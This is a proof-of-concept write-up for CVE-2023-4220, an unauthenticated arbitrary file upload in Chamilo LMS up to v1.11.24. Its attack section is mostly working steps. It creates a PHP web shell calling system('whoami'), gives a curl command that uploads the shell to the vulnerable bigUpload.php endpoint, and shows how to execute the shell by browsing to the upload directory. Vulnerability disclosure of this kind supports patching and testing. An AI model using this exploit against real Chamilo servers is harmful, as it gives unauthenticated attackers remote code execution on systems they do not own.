# Chamilo-LMS-Unauthenticated-File-Upload-
Unrestricted file upload in big file upload functionality in `/main/inc/lib/javascript/bigupload/inc/bigUpload.php` in Chamilo LMS &lt;= v1.11.24 allows unauthenticated attackers to perform stored cross-site scripting attacks and obtain remote code execution via uploading of web shell.

### Affected Version ≤v1.11.24

### **CVE Identifier** CVE-2023-4220

## **Vulnerability Summary**

The big file upload functionality by `/main/inc/lib/javascript/bigupload/inc/bigUpload.php` allows arbitrary files to be uploaded to `/main/inc/lib/javascript/bigupload/files` directory within the web root.

### **Proof-of-Concept**

- If `/main/inc/lib/javascript/bigupload/files` directory exist we can upload Arbitrary file as;
- Create a malicious php file `echo '<?php system("whoami"); ?>' > dollarboysushil.php`
	![[images/Untitled(1).png]]


- We can then upload this file by issuing following command
    
    ```
    `$ curl -F 'bigUploadFile=@dollarboysushil.php' 'http://<website>/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'` 
    ```
    ![[images/Untitled(2).png]]

- We can check our file is uploaded by visiting the `/main/inc/lib/javascript/bigupload/files` directory
    ![[images/Untitled(3).png]]
		

- And we can execute it by clicking the php file, which gives the output of `whoami` command
		![[images/Untitled(4).png]]